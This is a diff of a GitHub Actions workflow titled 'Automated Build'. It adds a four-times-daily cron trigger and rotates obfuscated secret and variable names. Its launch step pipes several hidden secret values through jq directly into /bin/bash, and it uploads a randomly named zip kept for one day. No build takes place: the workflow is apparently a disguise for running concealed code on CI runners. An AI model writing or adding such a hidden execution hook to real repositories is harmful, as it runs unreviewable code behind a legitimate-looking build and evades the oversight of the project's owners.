@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -17,18 +19,20 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          kyflb9964: ${{ secrets.kyflb9964 }}
+          mcs9706: ${{ secrets.mcs9706 }}
         run: |
-          printf '%s' "$kyflb9964" | jq -r .min5 | /bin/bash
-          printf '%s' "$hexkg3" | jq -r .qvkih7 | /bin/bash
-          echo $ha56 | jq -r .evuk428 | /bin/bash
-          printf '%s' "$yt19" | jq -r .nd46186 | /bin/bash
-          echo $csktf15286 | jq -r .azo9 | /bin/bash
-          printf '%s' "$hndtx8" | jq -r .y3492 | /bin/bash
+          printf '%s' "$mcs9706" | jq -r .h57888 | /bin/bash
+          printf '%s' "$zylu359" | jq -r .hzpkh95 | /bin/bash
+          echo $y4 | jq -r .jtpx307 | /bin/bash
+          printf '%s' "$sgba70010" | jq -r .x038 | /bin/bash
+          printf '%s' "$fkm1" | jq -r .v2 | /bin/bash
+          printf '%s' "$f296" | jq -r .k8901 | /bin/bash
+          printf '%s' "$xa19930" | jq -r .lewer06958 | /bin/bash
+          printf '%s' "$uj60029" | jq -r .kv600 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: XbeskiEM
+          name: iM53YhfO
           path: "*.zip"
           retention-days: 1
